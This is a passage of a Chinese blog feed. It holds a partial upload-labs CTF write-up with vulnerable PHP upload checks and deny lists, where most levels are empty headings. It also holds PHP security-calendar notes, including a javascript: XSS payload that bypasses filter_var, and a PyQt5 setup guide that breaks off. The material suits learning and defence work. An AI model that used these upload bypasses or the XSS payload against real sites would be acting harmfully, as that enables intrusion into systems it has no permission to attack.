    <content type="html"><![CDATA[<p>upload-labs解题记录</p><a id="more"></a><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查看源码，我们得知这里只是进行了前端的检测，所以我们先上传一个后缀名为gif的文件，然后抓包，在burp中把gif改成php，然后就可以直接绕过了</p><p><img src="http://images.xianyu123.club/up_pass1_1.png" alt></p><p><img src="http://images.xianyu123.club/up_pass1_2.png" alt></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查看源码，我们发现这里只是检测了http header字段中的<code>Content-Type</code>字段，并没有对后缀名进行检测，所以上传后缀名为php的文件即可</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>.asp,.aspx,.php,.jsp</code>后缀的文件</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;upload-labs解题记录&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php-security-calendar-2017漏洞分析笔记</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017漏洞分析笔记/</id>
    <published>2019-11-27T11:56:14.000Z</published>
    <updated>2019-11-30T07:33:22.182Z</updated>
    
    <content type="html"><![CDATA[<p>php-security-calendar-2017漏洞分析笔记</p><a id="more"></a><h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">        <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>任意文件上传</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在第12行代码中，因为in_array没有设置<code>strict</code>比较，则默认使用宽松比较，具体可参考<a href="https://www.php.net/manual/zh/function.in-array.php" target="_blank" rel="noopener">官方手册</a>,所以虽然设置了白名单，但还是可以进行任意文件上传。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">$file_name = <span class="string">'1a.php'</span>;</span><br><span class="line">var_dump(in_array($file_name, $whitelist));</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">      <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">      <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">'index.html'</span>,</span><br><span class="line">      [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>xss</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>第10行代码经过渲染之后可以防止被标签闭合，第22行<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>是验证url的函数，只需要构造<code>a://b</code>即可，然后在<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>里面可以用<code>javascript:</code>伪协议进行js代码的执行，参考<a href="https://www.cnblogs.com/song-song/p/5277838.html" target="_blank" rel="noopener">A标签使用javascript:伪协议</a>。因为nextSlide是通过GET请求接收的，那么构造<code>javascript://123%0aalert(1)</code>，这里的<code>//</code>对于<code>filter_var</code>函数来说是协议，但是对于js来说是注释，这样可以巧妙的绕过<code>filter_var</code>函数并且成功执行js代码。因为<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>里面跳转的链接是跳转到浏览器，所以对<code>%0a</code>再次进行url编码，所以构造<code>javascript://123%250aalert(1)</code></p><h3 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">  $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">  $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $template;</span><br><span class="line">  <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php-security-calendar-2017漏洞分析笔记&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Mac下pycharm + python3.7 + PyQt5 + Qt5.13.1配置</title>
    <link href="http://0clickjacking0.github.io/2019/10/30/Mac%E4%B8%8Bpycharm-python3-7-PyQt5-Qt5-13-1%E9%85%8D%E7%BD%AE/"/>
    <id>http://0clickjacking0.github.io/2019/10/30/Mac下pycharm-python3-7-PyQt5-Qt5-13-1配置/</id>
    <published>2019-10-30T01:27:22.000Z</published>
    <updated>2019-11-13T03:47:27.728Z</updated>
    
    <content type="html"><![CDATA[<p>Mac下pycharm + python3.7 + PyQt5 + Qt5.13.1配置</p><a id="more"></a><h1 id="初始环境："><a href="#初始环境：" class="headerlink" title="初始环境："></a>初始环境：</h1><p>mac: 10.13.6</p><p>pycharm: 2018.2.8</p><p>python: 3.7</p><p>pip: 10.0.1</p><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><h2 id="安装pyqt5"><a href="#安装pyqt5" class="headerlink" title="安装pyqt5"></a>安装pyqt5</h2><p>执行下面两条语句进行安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line"></span><br><span class="line">pip3 install PyQt5-sip</span><br></pre></td></tr></table></figure><h2 id="安装sip"><a href="#安装sip" class="headerlink" title="安装sip"></a>安装sip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install sip</span><br></pre></td></tr></table></figure><h2 id="安装qt"><a href="#安装qt" class="headerlink" title="安装qt"></a>安装qt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt</span><br></pre></td></tr></table></figure><h1 id="配置PyCharm"><a href="#配置PyCharm" class="headerlink" title="配置PyCharm"></a>配置PyCharm</h1><h2 id="切换到Python3-x环境"><a href="#切换到Python3-x环境" class="headerlink" title="切换到Python3.x环境"></a>切换到<code>Python3.x</code>环境</h2><p>因为我默认就是<code>3.x</code></p><p><img src="http://images.xianyu123.club/python3_env.png" alt></p><h2 id="配置GUI设计工具"><a href="#配置GUI设计工具" class="headerlink" title="配置GUI设计工具"></a>配置GUI设计工具</h2><p>点击<code>➕</code>进行添加</p><p><img src="http://images.xianyu123.club/qt1.png" alt></p><h3 id="添加Qt-Designer"><a href="#添加Qt-Designer" class="headerlink" title="添加Qt Designer"></a>添加Qt Designer</h3><p>然后填写下面的信息即可（因为我是用homebrew安装qt的，所以路径可能有点不一样，各位看仔细了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----Qt Designer</span><br><span class="line"></span><br><span class="line">Program----/usr/local/Cellar/qt/5.13.0/libexec/Designer.app</span><br><span class="line"></span><br><span class="line">Arguments----这个不需要填写</span><br><span class="line"></span><br><span class="line">Working dirctory----/usr/local/Cellar/qt/5.13.0/libexec</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt2.png" alt></p><h3 id="添加PyUIC"><a href="#添加PyUIC" class="headerlink" title="添加PyUIC"></a>添加PyUIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----PyUIC</span><br><span class="line"></span><br><span class="line">Program----/Library/Frameworks/Python.framework/Versions/3.7/bin/pyuic5</span><br><span class="line"></span><br><span class="line">Arguments----$FileName$ -o $FileNameWithoutExtension$.py</span><br><span class="line"></span><br><span class="line">Working dirctory----$FileDir$</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt3.png" alt></p><h3 id="验证是否成功添加"><a href="#验证是否成功添加" class="headerlink" title="验证是否成功添加"></a>验证是否成功添加</h3><p>点击tools-external tools</p><p><img src="http://images.xianyu123.club/qt4.png" alt></p><p>如果有下面这种显示的话，就代表成功了</p><p><img src="http://images.xianyu123.club/qt5.png" alt></p><p>然后我们随便创建一个<code>ui</code>文件，然后点击ui文件，右键使用我们刚才添加的external tools中PyUIC，如果能成功导出，则说明成功了</p><p><img 